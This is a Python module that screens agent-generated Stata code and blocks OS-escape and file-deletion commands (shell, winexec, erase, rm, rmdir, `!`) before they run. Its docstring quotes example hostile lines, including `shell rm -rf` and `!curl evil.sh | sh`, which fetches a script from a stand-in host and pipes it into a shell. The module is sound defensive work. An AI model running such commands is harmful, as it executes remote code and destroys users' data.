"""Command-safety policy for agent-run Stata code.

An agent driving Stata unattended will eventually emit an OS-level command —
``shell rm -rf``, ``erase results.dta``, ``!curl evil.sh | sh``, ``rmdir`` — either
by mistake or because a fetched instruction told it to. This module screens code
**before** it reaches Stata and blocks a configurable set of filesystem / OS-escape
commands by default, so an autonomous fix-and-rerun loop cannot delete files or run
arbitrary shell commands.

It is a guard rail, not a sandbox. A determined caller can turn it off
(``STATA_CODE_COMMAND_POLICY=off``) and it does not defend against every possible
obfuscation (e.g. building a command name from macros at runtime). Its job is to
make the *common* dangerous mistake impossible by default while staying out of the
way of legitimate econometrics code.

Configuration is read from the environment so it crosses the subprocess-pool
boundary (workers inherit the parent's env):

``STATA_CODE_COMMAND_POLICY``
    ``enforce`` (default) — block violating code and return a ``policy_blocked``
    ``RunResult``. ``off`` — disable the guard entirely. ``warn`` — do not block;
    callers that surface :func:`scan` results (the CLI, the linter) still report.
    At the library enforcement point ``warn`` behaves like ``off`` (nothing is
    blocked); it exists so a front-end can distinguish "silently allow" from
    "allow but tell the user".

``STATA_CODE_POLICY_ALLOW``
    Comma-separated command names to remove from the blocklist (e.g. ``shell,erase``).

``STATA_CODE_POLICY_BLOCK``
    Comma-separated extra command names to add to the blocklist (e.g. ``python,copy``).
"""

from __future__ import annotations

import os
import re
import uuid
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Literal

from stata_code.core.errors import label_for_rc, recovery_for
from stata_code.core.schema import (
    Backend,
    DatasetInfo,
    ErrorContext,
    ErrorInfo,
    ErrorKind,
    LogInfo,
    ResultsInfo,
    RunResult,
    StataEdition,
    StataInfo,
    StataReturns,
    Suggestion,
)

PolicyMode = Literal["enforce", "warn", "off"]

# rc sentinel for a policy block, alongside -1 crash / -2 timeout / -3 cancel.
POLICY_RC = -4

#: OS-escape / destructive commands blocked by default. These have no useful
#: role in reproducible empirical analysis run by an agent; a human who needs
#: them can allow them explicitly. Stata does not let any of these abbreviate,
#: so exact command-token matching is sufficient.
DEFAULT_BLOCKED: frozenset[str] = frozenset(
    {
        "shell",  # run an arbitrary OS command
        "winexec",  # launch an OS program (Windows)
        "erase",  # delete a file
        "rm",  # delete a file (alias of erase)
        "rmdir",  # remove a directory
    }
)

#: Command prefixes that can precede the real command on a line. Stripped
#: (with their common abbreviations) before the command token is examined so
#: ``capture noisily shell ...`` is still caught.
_PREFIXES: frozenset[str] = frozenset(
    {
        "capture",
        "cap",
        "quietly",
        "quiet",
        "quie",
        "qui",
        "noisily",
        "noisi",
        "nois",
        "noi",
    }
)


@dataclass(frozen=True)
class Violation:
    """One blocked command found in submitted code."""

    command: str
    line_number: int  # 1-based line in the submitted code
    line_text: str
    reason: str


@dataclass(frozen=True)
class CommandPolicy:
    """Resolved command policy: a mode plus the effective blocklist."""

    mode: PolicyMode = "enforce"
    blocked: frozenset[str] = field(default_factory=lambda: DEFAULT_BLOCKED)

    @property
    def enabled(self) -> bool:
        return self.mode == "enforce"

    def scan(self, code: str) -> list[Violation]:
        """Return every blocked command found in ``code`` (mode-independent)."""
        return _scan(code, self.blocked)


def _parse_names(raw: str | None) -> set[str]:
    if not raw:
        return set()
    return {tok.strip().lower() for tok in raw.replace(";", ",").split(",") if tok.strip()}


def policy_from_env(env: dict[str, str] | None = None) -> CommandPolicy:
    """Build a :class:`CommandPolicy` from environment variables.

    Unknown ``STATA_CODE_COMMAND_POLICY`` values fall back to ``enforce`` — the
    safe default — rather than silently disabling the guard on a typo.
    """
    src = os.environ if env is None else env
    raw_mode = (src.get("STATA_CODE_COMMAND_POLICY") or "enforce").strip().lower()
    mode: PolicyMode = raw_mode if raw_mode in ("enforce", "warn", "off") else "enforce"  # type: ignore[assignment]

    blocked = set(DEFAULT_BLOCKED)
    blocked -= _parse_names(src.get("STATA_CODE_POLICY_ALLOW"))
    blocked |= _parse_names(src.get("STATA_CODE_POLICY_BLOCK"))
    return CommandPolicy(mode=mode, blocked=frozenset(blocked))


# ─────────────────────────────────────────────────────────────────────────────
# Scanning.
# ─────────────────────────────────────────────────────────────────────────────

_LINE_COMMENT_RE = re.compile(r"(^|\s)//.*$")
_STAR_COMMENT_RE = re.compile(r"^\s*\*")
_BLOCK_COMMENT_RE = re.compile(r"/\*.*?\*/")
_WORD_RE = re.compile(r"[A-Za-z_][A-Za-z0-9_]*")


def _strip_comments(line: str) -> str:
    line = _BLOCK_COMMENT_RE.sub(" ", line)
    line = _LINE_COMMENT_RE.sub("", line)
    return line


def _logical_commands(code: str) -> list[tuple[int, str]]:
    """Split code into (1-based line number, command-text) pairs.

    Splits on newlines. When ``#delimit ;`` is active, additionally splits a
    line on ``;`` so ``#delimit ;`` blocks are screened too. Over-splitting is
    safe for a blocklist — it only creates more command candidates, never fewer.
    """
    out: list[tuple[int, str]] = []
    semicolon_mode = False
    for idx, raw in enumerate(code.replace("\r\n", "\n").split("\n"), start=1):
        stripped = raw.strip()
        if stripped.startswith("#delimit"):
            semicolon_mode = ";" in stripped
            continue
        if _STAR_COMMENT_RE.match(raw):
            continue
        text = _strip_comments(raw)
        parts = text.split(";") if semicolon_mode else [text]
        for part in parts:
            if part.strip():
                out.append((idx, part))
    return out


def _command_token(command_text: str) -> tuple[str | None, bool]:
    """Return ``(lowercased command token, is_bang)`` for a logical command.

    Leading whitespace and known command prefixes (``capture``, ``quietly``,
    ``noisily`` and abbreviations) are stripped first. A leading ``!`` is a
    shell escape and is reported as ``is_bang``.
    """
    rest = command_text.strip()
    while True:
        if rest.startswith("!"):
            return None, True
        match = _WORD_RE.match(rest)
        if match is None:
            return None, False
        word = match.group(0).lower()
        if word in _PREFIXES:
            rest = rest[match.end() :].lstrip()
            # A prefix may be followed by ``:`` (rare for these) — tolerate it.
            rest = rest[1:].lstrip() if rest.startswith(":") else rest
            continue
        return word, False


def _scan(code: str, blocked: frozenset[str]) -> list[Violation]:
    violations: list[Violation] = []
    for line_number, command_text in _logical_commands(code):
        token, is_bang = _command_token(command_text)
        if is_bang:
            violations.append(
                Violation(
                    command="!",
                    line_number=line_number,
                    line_text=command_text.strip(),
                    reason="`!` runs an arbitrary OS shell command.",
                )
            )
            continue
        if token is not None and token in blocked:
            violations.append(
                Violation(
                    command=token,
                    line_number=line_number,
                    line_text=command_text.strip(),
                    reason=f"`{token}` is blocked by the command-safety policy.",
                )
            )
    return violations


# ─────────────────────────────────────────────────────────────────────────────
# Enforcement: build a policy_blocked RunResult and gate execution.
# ─────────────────────────────────────────────────────────────────────────────


def _blocked_message(violations: list[Violation]) -> str:
    names = sorted({v.command for v in violations})
    listed = ", ".join(f"`{n}`" for n in names)
    first = violations[0]
    return (
        f"Command-safety policy blocked this run before Stata executed it: "
        f"{listed} (first at line {first.line_number}: {first.line_text!r}). "
        "These OS-escape / file-deletion commands are blocked by default. "
        "Rewrite the code without them, or, if you intend to run them, relax "
        "the policy with STATA_CODE_COMMAND_POLICY=off or "
        "STATA_CODE_POLICY_ALLOW=<command>."
    )


def build_policy_result(
    violations: list[Violation],
    *,
    session_id: str,
    elapsed_ms: int = 1,
) -> RunResult:
    """Construct the synthetic ``policy_blocked`` :class:`RunResult`.

    The code never reached Stata, so the log is empty and ``complete=True``
    (nothing is pending) and every result block is empty.
    """
    first = violations[0]
    allow_names = ",".join(sorted({v.command for v in violations if v.command != "!"}))
    suggestions = [
        Suggestion(
            action=(
                "Remove the blocked OS-escape command and perform the task with "
                "a native Stata command instead (e.g. `save`/`use`/`copy` for "
                "files) so the run does not touch the shell."
            ),
        )
    ]
    if allow_names:
        suggestions.append(
            Suggestion(
                action=(
                    "If this command is genuinely required, a human can allow it "
                    f"with STATA_CODE_POLICY_ALLOW={allow_names} or disable the "
                    "guard with STATA_CODE_COMMAND_POLICY=off."
                ),
                command=f"STATA_CODE_POLICY_ALLOW={allow_names}",
            )
        )
    error = ErrorInfo(
        kind=ErrorKind.POLICY_BLOCKED,
        rc=POLICY_RC,
        rc_label=label_for_rc(POLICY_RC),
        message=_blocked_message(violations),
        command=first.line_text,
        line=first.line_number,
        context=ErrorContext(before=[], failing=first.line_text, after=[]),
        commands_executed=0,
        path=None,
        varname=None,
        name=None,
        suggestions=suggestions,
        recovery=recovery_for(ErrorKind.POLICY_BLOCKED),
    )
    return RunResult(
        ok=False,
        rc=POLICY_RC,
        session_id=session_id,
        request_id=uuid.uuid4().hex,
        started_at=_utc_iso_ms(),
        elapsed_ms=max(1, elapsed_ms),
        stata_elapsed_ms=0,
        stata=StataInfo(
            version="unknown",
            edition=StataEdition.UNKNOWN,
            backend=Backend.PYSTATA,
        ),
        log=LogInfo(
            head="",
            tail="",
            lines_total=0,
            bytes_total=0,
            truncated=False,
            complete=True,
            error_window=None,
            ref=None,
        ),
        results=ResultsInfo(
            r=StataReturns(scalars={}, macros={}, matrices={}),
            e=StataReturns(scalars={}, macros={}, matrices={}),
            last_estimation_cmd=None,
        ),
        dataset=DatasetInfo(
            frame="default",
            n_obs=0,
            n_vars=0,
            changed=False,
            filename=None,
            variables=None,
        ),
        graphs=[],
        warnings=[],
        error=error,
        schema_version="1.0",
        capabilities=["command_policy"],
    )


def check(code: str, *, session_id: str = "main") -> RunResult | None:
    """Enforcement gate: return a ``policy_blocked`` result, or ``None`` to allow.

    Reads the active policy from the environment on every call so a caller can
    flip ``STATA_CODE_COMMAND_POLICY`` between runs. Returns ``None`` (allow) in
    ``off`` / ``warn`` mode or when nothing is blocked.
    """
    policy = policy_from_env()
    if not policy.enabled:
        return None
    violations = policy.scan(code)
    if not violations:
        return None
    return build_policy_result(violations, session_id=session_id)


def _utc_iso_ms() -> str:
    now = datetime.now(timezone.utc)
    return now.strftime("%Y-%m-%dT%H:%M:%S.") + f"{now.microsecond // 1000:03d}Z"


__all__ = [
    "CommandPolicy",
    "DEFAULT_BLOCKED",
    "POLICY_RC",
    "PolicyMode",
    "Violation",
    "build_policy_result",
    "check",
    "policy_from_env",
]
